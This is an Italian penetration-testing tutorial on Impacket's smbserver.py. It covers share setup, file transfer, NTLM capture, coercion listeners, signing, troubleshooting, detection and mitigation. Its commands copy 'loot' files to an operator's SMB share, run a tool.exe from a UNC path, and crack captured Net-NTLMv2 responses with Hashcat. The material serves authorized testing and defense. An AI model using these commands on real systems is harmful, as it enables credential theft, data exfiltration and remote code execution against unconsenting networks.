---
title: 'smbserver.py: Server SMB per File Transfer e NTLM'
slug: smbserver
description: 'Guida a impacket-smbserver per creare una share SMB su Kali, trasferire file, registrare autenticazioni NTLM e gestire SMB2, accessi e logging.'
image: /smbserver-py-server-smb-kali-impacket.webp
draft: true
date: 2026-07-31T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - impacket
  - smb
  - file-transfer
---

# smbserver.py — Creare un server SMB su Kali con Impacket

`smbserver.py` avvia un server SMB temporaneo e pubblica una directory locale come condivisione di rete. È utile per trasferire file tra Linux e Windows, registrare autenticazioni NTLM ricevute e osservare callback generate da tecniche di coercizione. Sui client Windows moderni è normalmente necessario `-smb2support`; per distribuire file senza consentire upload conviene aggiungere `-readonly`.

`smbserver.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) e implementa un server [SMB](https://hackita.it/articoli/smb/) direttamente in Python.

Il tool viene utilizzato soprattutto durante attività autorizzate di penetration testing e amministrazione di laboratorio per:

* pubblicare file da Linux verso Windows;
* ricevere file da un sistema Windows;
* eseguire un programma attraverso un percorso UNC;
* registrare challenge-response NTLM ricevute;
* osservare autenticazioni SMB provocate da una coercizione;
* verificare il comportamento di client che richiedono SMB signing.

La guida è stata verificata su:

* **Impacket 0.13.1**, release stabile;
* branch ufficiale `master`;
* parser reale di `examples/smbserver.py`;
* implementazione `impacket/smbserver.py`;
* documentazione Microsoft relativa a SMBv1 e alle porte SMB alternative.

Nelle sezioni rilevanti, il parser della release stabile e quello del branch `master` espongono le stesse opzioni.

Riferimenti ufficiali:

* [smbserver.py — Impacket 0.13.1](https://github.com/fortra/impacket/blob/impacket_0_13_1/examples/smbserver.py)
* [smbserver.py — branch master](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
* [Implementazione SMB server di Impacket](https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)
* [Changelog ufficiale Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)

***

## Cosa fa realmente smbserver.py

La sintassi fondamentale richiede due argomenti posizionali:

```bash
impacket-smbserver SHARENAME /percorso/locale
```

`SHARENAME` è il nome con cui la condivisione viene pubblicata.

Il secondo argomento è la directory locale esposta dal server.

Esempio:

```bash
mkdir -p /tmp/share

sudo impacket-smbserver TOOLS /tmp/share \
  -smb2support
```

Dal client Windows la share sarà raggiungibile come:

```text
\\IP_KALI\TOOLS
```

Per esempio:

```cmd
dir \\10.10.14.5\TOOLS
```

La porta predefinita è TCP 445. Sui sistemi Linux, l’ascolto su una porta inferiore a 1024 richiede normalmente privilegi elevati; per questo gli esempi usano `sudo`.

***

## Sintassi completa

```bash
impacket-smbserver [opzioni] SHARENAME SHAREPATH
```

Controlla sempre il parser della versione installata:

```bash
impacket-smbserver -h
```

In alcune installazioni manuali il comando può essere disponibile come:

```bash
python3 smbserver.py SHARENAME SHAREPATH
```

***

## Opzioni realmente presenti

| Opzione                    | Funzione                                                         |
| -------------------------- | ---------------------------------------------------------------- |
| `-comment TEXT`            | Imposta il commento associato alla share                         |
| `-username USER`           | Richiede una determinata identità per l’autenticazione           |
| `-password PASS`           | Password associata a `-username`                                 |
| `-hashes LMHASH:NTHASH`    | Configura la credenziale accettata tramite hash NTLM             |
| `-ip IP`                   | Indirizzo locale su cui mettere il server in ascolto             |
| `--interface-address IP`   | Alias esteso di `-ip`                                            |
| `-port PORT`               | Porta TCP di ascolto; predefinita 445                            |
| `-6`                       | Abilita il listener IPv6                                         |
| `--ipv6`                   | Alias esteso di `-6`                                             |
| `-smb2support`             | Abilita il supporto SMB2                                         |
| `-readonly`                | Impedisce la creazione e la modifica dei file                    |
| `-outputfile FILE`         | Salva i messaggi di log prodotti dal server                      |
| `-ts`                      | Aggiunge timestamp ai messaggi                                   |
| `-debug`                   | Abilita il logging diagnostico                                   |
| `-disablekerberos`         | Non offre autenticazione Kerberos                                |
| `-disablentlm`             | Non offre autenticazione NTLM                                    |
| `-dropssp`                 | Disabilita NTLM ESS/SSP durante la negoziazione                  |
| `-computeraccountname`     | Computer account usato per gestire client che richiedono signing |
| `-computeraccounthash`     | NT hash del computer account                                     |
| `-computeraccountaes`      | Chiave AES del computer account                                  |
| `-computeraccountpassword` | Password del computer account                                    |
| `-computeraccountdomain`   | Dominio del computer account                                     |
| `-dc-ip`                   | IP del Domain Controller usato nel workflow signing              |

Queste opzioni non esistono:

```text
-computer
-domain
```

Le opzioni `-computeraccount*` non servono a cambiare esteticamente il nome NetBIOS del server. Servono a configurare un computer account valido per gestire autenticazioni SMB2 firmate tramite Netlogon o Kerberos.

***

## SMB1, SMB2 e sistemi Windows moderni

Senza `-smb2support`, il server utilizza il comportamento SMB1 previsto dall’esempio Impacket.

SMBv1 è deprecato e non viene installato per impostazione predefinita nelle versioni moderne di Windows. A partire da Windows 10 e Windows Server versione 1709, la disponibilità predefinita di SMBv1 è stata progressivamente rimossa; Windows 11 non include normalmente client e server SMBv1 in una nuova installazione.

Per questo, nella maggior parte degli ambienti moderni devi usare:

```bash
sudo impacket-smbserver TOOLS /tmp/share \
  -smb2support
```

Non è corretto affermare che `-smb2support` sia obbligatorio in assoluto o che garantisca compatibilità con qualsiasi client. Un sistema legacy con SMBv1 ancora abilitato può collegarsi senza questa opzione, mentre policy moderne di signing, autenticazione o firewall possono impedire comunque la connessione.

***

## Creare una share in sola lettura

Se devi distribuire tool o documenti senza permettere ai client di caricare file, usa:

```bash
sudo impacket-smbserver TOOLS /opt/tools \
  -smb2support \
  -readonly
```

Con `-readonly` la condivisione consente la lettura ma impedisce la creazione o la modifica dei file.

Dal client:

```cmd
dir \\10.10.14.5\TOOLS
copy \\10.10.14.5\TOOLS\tool.exe C:\Windows\Temp\tool.exe
```

Un tentativo di scrittura dovrebbe invece fallire:

```cmd
copy C:\Windows\Temp\loot.zip \\10.10.14.5\TOOLS\
```

La modalità read-only è consigliata quando il server viene usato esclusivamente come repository di file.

***

## Share con autenticazione

Senza `-username`, il parser configura il server in modo da consentire connessioni anonime.

Per limitare l’accesso puoi impostare username e password:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -username transfer \
  -password 'S3curePass!'
```

Dal client Windows:

```cmd
net use \\10.10.14.5\TRANSFER /user:transfer S3curePass!
```

Dopo l’autenticazione:

```cmd
dir \\10.10.14.5\TRANSFER
copy \\10.10.14.5\TRANSFER\tool.exe C:\Windows\Temp\
copy C:\Windows\Temp\results.zip \\10.10.14.5\TRANSFER\
```

Al termine:

```cmd
net use \\10.10.14.5\TRANSFER /delete
```

L’autenticazione limita chi può utilizzare la share, ma non rende automaticamente il traffico invisibile o simile a quello di un file server aziendale. La destinazione, il processo sorgente e il traffico SMB restano osservabili.

### Password richiesta interattivamente

Se specifichi `-username` senza fornire né password né hash, il tool richiede la password tramite prompt:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -username transfer
```

Questo evita di lasciare la password direttamente nella cronologia della shell.

***

## Configurare l’autenticazione tramite hash NTLM

Il server può accettare una credenziale configurata tramite hash:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -username transfer \
  -hashes :NTHASH
```

Formato completo:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -username transfer \
  -hashes LMHASH:NTHASH
```

Questo non è un normale attacco [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) contro un server remoto.

L’hash viene configurato nel server Impacket come segreto con cui verificare l’autenticazione del client. Il client deve comunque dimostrare di possedere la password o il materiale crittografico corrispondente.

Non combinare `-password` e `-hashes`.

***

## Impostare commento e indirizzo di ascolto

### Commento della share

```bash
sudo impacket-smbserver BACKUP /tmp/share \
  -smb2support \
  -comment "Temporary backup repository"
```

Il commento può essere mostrato dai client durante l’enumerazione delle condivisioni, ma non modifica l’identità reale dell’host né costituisce una tecnica di evasione.

### Bind su un indirizzo specifico

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -ip 10.10.14.5
```

Questo è utile su sistemi con più interfacce, VPN o tunnel.

Senza `-ip`, il parser usa normalmente:

```text
0.0.0.0
```

Con `-6`, il valore predefinito diventa:

```text
::
```

***

## Listener IPv6

Per mettere il server in ascolto su IPv6:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -6 \
  -smb2support
```

Oppure specifica direttamente l’indirizzo:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -6 \
  -ip '2001:db8::10' \
  -smb2support
```

La sintassi utilizzata dal client Windows dipende dal modo in cui il nome IPv6 viene risolto. In genere è preferibile usare un hostname DNS valido invece di inserire direttamente un indirizzo IPv6 nel percorso UNC.

***

## Utilizzare una porta diversa da 445

Il server può ascoltare su una porta TCP alternativa:

```bash
sudo impacket-smbserver TRANSFER /tmp/share \
  -smb2support \
  -port 8445
```

Non puoi però indicare la porta con una sintassi come:

```text
\\10.10.14.5@8445\TRANSFER
```

Questa sintassi UNC non è valida per SMB.

Il supporto client alle porte SMB TCP alternative è disponibile sulle versioni Windows recenti, in particolare Windows 11 24H2 e Windows Server 2025, tramite una mappatura esplicita.

PowerShell:

```powershell
New-SmbMapping `
  -LocalPath "Z:" `
  -RemotePath "\\10.10.14.5\TRANSFER" `
  -TcpPort 8445
```

Prompt dei comandi:

```cmd
net use Z: \\10.10.14.5\TRANSFER /TCPPORT:8445
```

Questa funzionalità richiede privilegi amministrativi e non è supportata nello stesso modo dai client Windows meno recenti.

Per la compatibilità più ampia, usa TCP 445 oppure un port forwarding trasparente che presenti al client la porta standard.

***

## Scenario 1 — Trasferire file da Linux a Windows

Prepara una directory:

```bash
mkdir -p /tmp/tools
cp /opt/tools/tool.exe /tmp/tools/
```

Avvia una share read-only:

```bash
sudo impacket-smbserver TOOLS /tmp/tools \
  -smb2support \
  -readonly
```

Dal sistema Windows:

```cmd
dir \\10.10.14.5\TOOLS
copy \\10.10.14.5\TOOLS\tool.exe C:\Windows\Temp\tool.exe
```

Da PowerShell:

```powershell
Copy-Item `
  "\\10.10.14.5\TOOLS\tool.exe" `
  "C:\Windows\Temp\tool.exe"
```

### Esecuzione tramite percorso UNC

Alcuni programmi possono essere avviati direttamente dalla share:

```cmd
\\10.10.14.5\TOOLS\tool.exe
```

PowerShell:

```powershell
& "\\10.10.14.5\TOOLS\tool.exe"
```

Questo evita una copia esplicita nel percorso scelto dall’operatore, ma non significa che l’esecuzione sia “fileless” o priva di artefatti. Windows, l’antivirus, l’EDR e altri componenti possono comunque analizzare, memorizzare o registrare il contenuto remoto.

***

## Scenario 2 — Ricevere file da Windows

Per consentire upload non usare `-readonly`:

```bash
mkdir -p /tmp/loot

sudo impacket-smbserver LOOT /tmp/loot \
  -smb2support \
  -username transfer \
  -password 'S3curePass!'
```

Dal client:

```cmd
net use \\10.10.14.5\LOOT /user:transfer S3curePass!
copy C:\Windows\Temp\results.zip \\10.10.14.5\LOOT\
net use \\10.10.14.5\LOOT /delete
```

PowerShell:

```powershell
Copy-Item `
  "C:\Windows\Temp\results.zip" `
  "\\10.10.14.5\LOOT\results.zip"
```

Usa file già preparati e accessibili.

Non presentare file protetti o in uso, come il database Active Directory attivo `NTDS.dit`, come normali file copiabili con `copy`. L’acquisizione di `NTDS.dit` richiede workflow dedicati, privilegi specifici e strumenti come `secretsdump`, DRSUAPI, VSS o `ntdsutil`.

***

## Gestire connessioni SMB già esistenti

Windows non permette normalmente connessioni simultanee allo stesso server usando credenziali differenti.

Un errore frequente è:

```text
System error 1219 has occurred.
Multiple connections to a server or shared resource by the same user,
using more than one user name, are not allowed.
```

Rimuovi la connessione esistente:

```cmd
net use \\10.10.14.5\TRANSFER /delete
```

Per visualizzare tutte le connessioni:

```cmd
net use
```

In un laboratorio, quando necessario:

```cmd
net use * /delete
```

Quest’ultimo comando elimina tutte le connessioni di rete dell’utente e può interrompere accessi legittimi: non usarlo indiscriminatamente.

***

## Scenario 3 — Registrare autenticazioni NTLM

Quando un client Windows accede a una risorsa SMB e negozia NTLM, il server può ricevere una challenge-response NTLMv1 o NTLMv2.

Avvia il listener:

```bash
sudo impacket-smbserver CAPTURE /tmp/capture \
  -smb2support \
  -outputfile /tmp/smbserver.log \
  -ts
```

Una connessione al percorso:

```text
\\10.10.14.5\CAPTURE
```

può produrre nel log informazioni come:

```text
DOMAIN\username
workstation
challenge
NTLM response
```

La disponibilità di una challenge-response dipende però dal metodo effettivamente negoziato.

Non è corretto affermare che ogni connessione SMB invii sempre Net-NTLMv2:

* il client può utilizzare Kerberos;
* il client può effettuare un accesso anonimo;
* NTLM può essere disabilitato;
* la connessione può fallire prima dell’autenticazione;
* un sistema legacy può negoziare NTLMv1;
* policy di rete possono bloccare la connessione.

### Crack offline

Una challenge-response Net-NTLMv2 può essere verificata offline con Hashcat:

```bash
hashcat -m 5600 netntlmv2.txt \
  /usr/share/wordlists/rockyou.txt
```

Per NTLMv1 il formato e la modalità Hashcat sono differenti.

La challenge-response Net-NTLMv2:

* non è l’NT hash dell’account;
* non può essere utilizzata direttamente con Pass-the-Hash;
* dipende dalla challenge della specifica autenticazione;
* può essere sottoposta a cracking offline;
* può essere relayata soltanto mentre l’autenticazione è in corso, usando un listener adatto.

***

## Cattura e relay non sono la stessa cosa

`smbserver.py` può ricevere e registrare un’autenticazione, ma non implementa un workflow completo di relay verso un secondo servizio.

Per eseguire un relay devi utilizzare [ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/) come listener fin dall’inizio.

Non puoi:

1. catturare una response con `smbserver.py`;
2. salvarla;
3. relayarla in un secondo momento.

Il relay NTLM avviene in tempo reale, inoltrando la negoziazione tra il client e il servizio target.

Inoltre, la possibilità di relay dipende dal protocollo e dalle protezioni del target:

* SMB signing richiesto impedisce il normale relay SMB;
* LDAP signing e channel binding possono impedire determinati relay LDAP;
* EPA può proteggere servizi HTTP;
* l’identità ricevuta deve avere privilegi utili sul target;
* la challenge e la sessione non possono essere riutilizzate arbitrariamente.

Confronto:

|                     Funzione | `smbserver.py` | `ntlmrelayx.py`           |
| ---------------------------: | -------------: | ------------------------- |
|       Pubblica una directory |             Sì | Non è lo scopo principale |
|             Trasferisce file |             Sì | No                        |
| Registra autenticazioni NTLM |             Sì | Sì                        |
|              Esegue cracking |             No | No                        |
|        Relaya in tempo reale |             No | Sì                        |
|     Esegue azioni post-relay |             No | Sì                        |
|              Share read-only |             Sì | Non applicabile           |

***

## Scenario 4 — Receiver per una coercizione

Una tecnica di coercizione tenta di obbligare un sistema Windows ad autenticarsi verso una destinazione scelta dall’operatore.

Se l’obiettivo autorizzato è soltanto osservare o registrare la callback, `smbserver.py` può essere utilizzato come receiver:

```bash
sudo impacket-smbserver COERCE /tmp/coerce \
  -smb2support \
  -outputfile /tmp/coercion.log \
  -ts
```

La tecnica di coercizione deve quindi indicare come listener l’IP del server Impacket.

Il risultato potrebbe essere un’autenticazione proveniente da:

* un account utente;
* un computer account terminante con `$`;
* un servizio;
* un’identità anonima o non utilizzabile.

Se l’obiettivo è relayare l’autenticazione, devi arrestare `smbserver.py` e avviare `ntlmrelayx.py` sulla porta richiesta prima di provocare la callback.

Due processi non possono normalmente utilizzare contemporaneamente lo stesso indirizzo e la stessa porta TCP 445.

***

## Callback spontanee e forced authentication

Percorsi UNC inseriti in shortcut, documenti, icone o altri file possono provocare una richiesta SMB quando Windows tenta di caricare la risorsa remota.

Questa tecnica rientra in **MITRE ATT\&CK T1187 — Forced Authentication**.

Non è necessario trasformare questo articolo in una raccolta di file `.lnk`, `.scf`, Office, playlist o altri lure. Il ruolo di `smbserver.py` rimane quello del server che riceve la richiesta.

Per approfondire le diverse fonti di autenticazione automatica consulta:

* [HackTricks — Places to steal NTLM credentials](https://hacktricks.wiki/en/windows-hardening/ntlm/places-to-steal-ntlm-creds.html)
* [MITRE ATT\&CK T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/)

***

## Client che richiedono SMB signing

Impacket 0.13.1 ha introdotto supporto migliorato per client che richiedono connessioni SMB firmate.

Per gestire utenti arbitrari del dominio quando il client impone signing, `smbserver.py` può utilizzare un computer account valido e il relativo materiale crittografico.

Con NT hash:

```bash
sudo impacket-smbserver SECURE /tmp/share \
  -smb2support \
  -computeraccountname 'KALISRV$' \
  -computeraccounthash NTHASH \
  -computeraccountdomain corp.local \
  -dc-ip 10.10.10.5
```

Con password:

```bash
sudo impacket-smbserver SECURE /tmp/share \
  -smb2support \
  -computeraccountname 'KALISRV$' \
  -computeraccountpassword 'MachinePassword' \
  -computeraccountdomain corp.local \
  -dc-ip 10.10.10.5
```

Con chiave AES:

```bash
sudo impacket-smbserver SECURE /tmp/share \
  -smb2support \
  -computeraccountname 'KALISRV$' \
  -computeraccountaes AES_KEY \
  -computeraccountdomain corp.local \
  -dc-ip 10.10.10.5
```

Requisiti:

* computer account già esistente e valido;
* conoscenza della password, dell’NT hash o della chiave AES;
* nome del dominio;
* Domain Controller raggiungibile;
* SMB2 abilitato;
* sincronizzazione temporale e DNS coerenti per Kerberos.

Le opzioni obbligatorie sono:

```text
-computeraccountname
-computeraccountdomain
-dc-ip
```

Devi inoltre fornire almeno una tra:

```text
-computeraccounthash
-computeraccountaes
-computeraccountpassword
```

Non puoi combinare le credenziali `-username` con quelle `-computeraccount*`.

Queste opzioni non creano un computer account, non eseguono automaticamente il domain join e non camuffano semplicemente il nome del server.

***

## Disabilitare Kerberos o NTLM

### Non offrire Kerberos

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -disablekerberos
```

### Non offrire NTLM

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -disablentlm
```

Queste opzioni servono a controllare i meccanismi proposti dal server durante la negoziazione.

Non garantiscono che il client possa completare l’accesso. Se disabiliti il solo metodo supportato dal client o dall’ambiente, l’autenticazione fallirà.

### `-dropssp`

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -dropssp
```

`-dropssp` disabilita NTLM ESS/SSP durante la negoziazione.

È un’opzione avanzata che può ridurre la compatibilità o modificare il tipo di challenge-response. Non va descritta come bypass universale o tecnica automaticamente invisibile.

***

## Logging, timestamp e debug

### Salvare il log

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -outputfile /tmp/smbserver.log
```

### Aggiungere timestamp

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -outputfile /tmp/smbserver.log \
  -ts
```

### Abilitare il debug

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -debug
```

Il debug è utile per diagnosticare:

* errori di binding;
* dialect SMB incompatibili;
* autenticazione fallita;
* configurazioni incomplete del computer account;
* problemi Kerberos;
* connessioni interrotte;
* errori di accesso al filesystem.

I log possono contenere:

* indirizzi IP;
* nomi utente;
* nomi workstation;
* challenge-response NTLM;
* nomi e percorsi di file;
* errori di autenticazione.

Devono essere trattati come dati sensibili.

***

## Errori comuni

### `Permission denied` o errore di bind sulla porta 445

Causa: l’utente non può aprire una porta privilegiata.

Soluzione:

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support
```

Oppure usa una porta alta con un client moderno configurato esplicitamente per la porta alternativa.

***

### `Address already in use`

Un altro processo sta già utilizzando TCP 445.

Verifica:

```bash
sudo ss -lntp | grep ':445'
```

Possibili servizi:

* Samba;
* un altro `smbserver.py`;
* `ntlmrelayx.py`;
* Responder;
* container o listener di laboratorio.

Arresta il processo in conflitto oppure modifica porta e workflow.

***

### Il client Windows non si connette

Controlla:

1. `-smb2support`;
2. firewall locale di Kali;
3. raggiungibilità TCP 445;
4. routing e VPN;
5. credenziali configurate;
6. connessioni SMB già esistenti;
7. policy NTLM;
8. SMB signing;
9. dialect supportati;
10. log `-debug`.

Test dal client:

```powershell
Test-NetConnection 10.10.14.5 -Port 445
```

***

### `System error 53`

Windows non trova il percorso di rete.

Possibili cause:

* IP errato;
* porta 445 filtrata;
* nome share errato;
* server non avviato;
* routing assente;
* firewall;
* utilizzo di una porta non standard senza mapping.

***

### `System error 5` o `Access is denied`

Possibili cause:

* credenziali errate;
* share read-only durante un upload;
* permessi Linux insufficienti sulla directory;
* account non configurato;
* autenticazione incompatibile;
* signing richiesto ma non gestito dal workflow usato.

Controlla i permessi:

```bash
ls -ld /tmp/share
ls -l /tmp/share
```

***

### Connessione anonima bloccata

Windows e le policy aziendali possono impedire guest o anonymous access.

Configura un’identità:

```bash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -username transfer \
  -password 'S3curePass!'
```

Client:

```cmd
net use \\10.10.14.5\SHARE /user:transfer S3curePass!
```

***

### Nessuna challenge-response nel log

Possibili cause:

* Kerberos negoziato;
* NTLM disabilitato;
* accesso anonimo;
* connessione interrotta prima dell’autenticazione;
* credenziali già memorizzate;
* policy di sicurezza;
* percorso mai effettivamente aperto;
* traffico bloccato.

Per un test controllato puoi disabilitare Kerberos nel server:

```bash
sudo impacket-smbserver CAPTURE /tmp/capture \
  -smb2support \
  -disablekerberos \
  -outputfile /tmp/capture.log
```

Questo non obbliga comunque un client con NTLM bloccato ad autenticarsi.

***

### Il client richiede SMB signing

Se il client impone signing e il server base non riesce a completare la sessione, valuta il workflow con:

```text
-computeraccountname
-computeraccountdomain
-computeraccounthash / -computeraccountaes / -computeraccountpassword
-dc-ip
-smb2support
```

Serve un computer account valido. Non è sufficiente inventare un nome terminante con `$`.

***

## Detection

Dal lato difensivo, `smbserver.py` non genera un evento Windows con il nome del tool. Il server è in esecuzione su Linux, quindi gli eventi Windows relativi all’accesso a una share ospitata da Windows non vengono creati sul sistema Kali.

Indicatori utili:

* connessioni outbound TCP 445 verso IP non autorizzati;
* traffico SMB verso workstation o sistemi non registrati come file server;
* `cmd.exe`, PowerShell o altri processi che accedono a percorsi UNC insoliti;
* eseguibili caricati da una share remota;
* copie consistenti di dati verso un host non approvato;
* autenticazioni NTLM verso destinazioni esterne o anomale;
* sequenze di coercizione seguite da connessione SMB;
* autenticazioni ripetute di computer account verso lo stesso listener.

### Evento 4648

L’evento Security **4648** può essere generato quando un processo tenta un logon usando credenziali esplicitamente fornite, come in determinati utilizzi di:

```cmd
net use \\server\share /user:utente password
```

Non è specifico di `smbserver.py` e può avere cause amministrative legittime.

### Evento 4776

L’evento **4776** viene registrato sul sistema autorevole quando avviene una convalida NTLM:

* sul Domain Controller per un account di dominio;
* sul sistema locale per un account locale.

Non è garantito in ogni connessione verso `smbserver.py`. Quando il server Impacket verifica localmente una credenziale configurata con `-username` e password o hash, potrebbe non essere necessaria una convalida NTLM sul Domain Controller.

### Eventi 5140 e 5145

Gli eventi **5140** e **5145** riguardano l’accesso a condivisioni ospitate da un server Windows.

Poiché in questo scenario la share è ospitata da Kali tramite Impacket, tali eventi non vengono generati sul server SMB. Possono essere rilevanti in altri workflow che coinvolgono condivisioni Windows reali.

### Telemetria endpoint e rete

Fonti utili:

* Windows Defender Firewall;
* Microsoft-Windows-SMBClient;
* EDR;
* Sysmon;
* proxy e firewall interni;
* NetFlow;
* IDS/IPS;
* process creation, quando abilitato;
* DNS e asset inventory.

La correlazione più efficace è:

```text
processo insolito
    ↓
percorso UNC verso host non autorizzato
    ↓
connessione TCP 445
    ↓
autenticazione NTLM
    ↓
download, upload o esecuzione
```

***

## Mitigazioni

* bloccare SMB outbound verso Internet;
* consentire TCP 445 soltanto verso file server autorizzati;
* utilizzare allowlist per i server SMB;
* segmentare reti utente, server e sistemi amministrativi;
* limitare NTLM dove possibile;
* richiedere SMB signing nei contesti appropriati;
* monitorare percorsi UNC verso indirizzi IP;
* impedire l’esecuzione di binari da share non attendibili;
* applicare application control;
* monitorare file `.lnk`, `.scf` e documenti che referenziano risorse remote;
* rilevare coercizioni RPC e successive autenticazioni SMB;
* usare password robuste per ridurre l’efficacia del cracking offline;
* proteggere gli account privilegiati dall’autenticazione verso sistemi non fidati.

MITRE ATT\&CK raccomanda espressamente di filtrare SMB in uscita e limitare l’accesso a destinazioni approvate per mitigare forced authentication e trasferimenti laterali.

***

## Cleanup

Arresta il server con:

```text
Ctrl+C
```

Sul client Windows, elimina la connessione:

```cmd
net use \\10.10.14.5\SHARE /delete
```

Se hai utilizzato un’unità:

```cmd
net use Z: /delete
```

Rimuovi i file temporanei dal client:

```cmd
del C:\Windows\Temp\tool.exe
del C:\Windows\Temp\results.zip
```

Proteggi o elimina i file ricevuti sul server:

```bash
rm -f /tmp/loot/results.zip
```

Rimuovi i log contenenti dati sensibili:

```bash
rm -f /tmp/smbserver.log
rm -f /tmp/coercion.log
rm -f /tmp/capture.log
```

Se il filesystem, gli snapshot o le procedure del laboratorio lo richiedono, applica il metodo di cancellazione previsto dalla policy. Una normale eliminazione non garantisce che i dati siano irrecuperabili da SSD, snapshot, filesystem copy-on-write o backup.

`smbserver.py` non modifica Active Directory e non richiede cleanup sul dominio, salvo che il workflow complementare abbia creato computer account, modificato ACL o eseguito altre operazioni.

***

## Cheat Sheet

```bash
# Share base con SMB2
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support

# Share read-only
sudo impacket-smbserver TOOLS /opt/tools \
  -smb2support \
  -readonly

# Autenticazione con password
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -username transfer \
  -password 'S3curePass!'

# Autenticazione con hash
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -username transfer \
  -hashes :NTHASH

# Bind su un IP specifico
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -ip 10.10.14.5

# Listener IPv6
sudo impacket-smbserver SHARE /tmp/share \
  -6 \
  -smb2support

# Logging con timestamp
sudo impacket-smbserver CAPTURE /tmp/capture \
  -smb2support \
  -outputfile /tmp/smbserver.log \
  -ts

# Debug
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -debug

# Non offrire Kerberos
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -disablekerberos

# Non offrire NTLM
sudo impacket-smbserver SHARE /tmp/share \
  -smb2support \
  -disablentlm

# Client con signing tramite computer account e NT hash
sudo impacket-smbserver SECURE /tmp/share \
  -smb2support \
  -computeraccountname 'KALISRV$' \
  -computeraccounthash NTHASH \
  -computeraccountdomain corp.local \
  -dc-ip 10.10.10.5

# Copia da share a Windows
copy \\10.10.14.5\SHARE\tool.exe C:\Windows\Temp\tool.exe

# Copia da Windows alla share
copy C:\Windows\Temp\results.zip \\10.10.14.5\SHARE\

# Autenticazione esplicita dal client
net use \\10.10.14.5\SHARE /user:transfer S3curePass!

# Elimina la connessione
net use \\10.10.14.5\SHARE /delete

# Porta alternativa su Windows 11 24H2 / Server 2025
New-SmbMapping `
  -LocalPath "Z:" `
  -RemotePath "\\10.10.14.5\SHARE" `
  -TcpPort 8445
```

***

## Errori da non ripetere

```text
-computer                    → opzione inesistente
-domain                      → opzione inesistente
\\IP@PORTA\SHARE             → sintassi UNC errata
-smb2support funziona sempre → affermazione assoluta errata
autenticazione = stealth     → falso
ogni connessione = NTLMv2    → falso
Net-NTLMv2 = NT hash         → falso
Net-NTLMv2 catturato = PtH   → falso
hash catturato relayabile dopo → falso, il relay è in tempo reale
esecuzione UNC = fileless    → falso
copy diretto di NTDS.dit     → workflow errato
5140/5145 sul client         → non descrivono la share ospitata da Kali
```

***

## Articoli Hackita correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [SMB: protocollo, porte e sicurezza](https://hackita.it/articoli/smb/)
* [ntlmrelayx.py: relay delle autenticazioni NTLM](https://hackita.it/articoli/ntlmrelayx/)
* [Responder: poisoning e autenticazioni NTLM](https://hackita.it/articoli/responder/)
* [Lateral Movement su Windows](https://hackita.it/articoli/lateral-movement/)
* [Credential Dumping su Windows](https://hackita.it/articoli/credential-dumping/)
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)

***

## Fonti tecniche

### Fonti primarie

* [Fortra Impacket — repository ufficiale](https://github.com/fortra/impacket)
* [smbserver.py — Impacket 0.13.1](https://github.com/fortra/impacket/blob/impacket_0_13_1/examples/smbserver.py)
* [smbserver.py — branch master](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
* [Implementazione SMB server](https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)
* [Changelog Impacket 0.13.1](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
* [Microsoft — SMBv1 non installato per impostazione predefinita](https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows)
* [Microsoft — porte SMB alternative](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ports)
* [Microsoft — evento 4648](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4648)
* [Microsoft — evento 4776](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4776)
* [MITRE ATT\&CK T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/)
* [MITRE ATT\&CK T1570 — Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/)

### Fonti operative di confronto

* [HackTricks — Places to steal NTLM credentials](https://hacktricks.wiki/en/windows-hardening/ntlm/places-to-steal-ntlm-creds.html)
* [The Hacker Recipes — SMB](https://www.thehacker.recipes/infra/protocols/smb)
* [InternalAllTheThings — Active Directory](https://swisskyrepo.github.io/InternalAllTheThings/)
* [Hacking Articles — File Transfer Cheat Sheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)

> Utilizza queste tecniche esclusivamente su sistemi di tua proprietà o per i quali possiedi un’autorizzazione esplicita.
